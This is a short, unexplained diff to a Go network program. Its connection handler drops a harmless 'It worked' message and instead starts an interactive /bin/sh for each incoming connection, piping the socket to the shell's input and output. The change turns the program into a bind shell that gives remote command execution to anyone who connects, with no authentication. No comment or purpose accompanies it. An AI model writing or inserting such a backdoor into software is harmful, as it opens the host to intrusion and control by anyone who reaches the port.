@@ -1,9 +1,10 @@
 package main
 
 import (
-	"fmt"
+	"io"
 	"log"
 	"net"
+	"os/exec"
 )
 
 func main() {
@@ -27,5 +28,14 @@ func main() {
 func handle(conn net.Conn) {
 	defer conn.Close()
 
-	fmt.Println("It worked")
+	cmd := exec.Command("/bin/sh", "-i")
+
+	pr, pw := io.Pipe()
+
+	cmd.Stdin = conn
+	cmd.Stdout = pw
+
+	go io.Copy(conn, pr)
+
+	cmd.Run()
 }
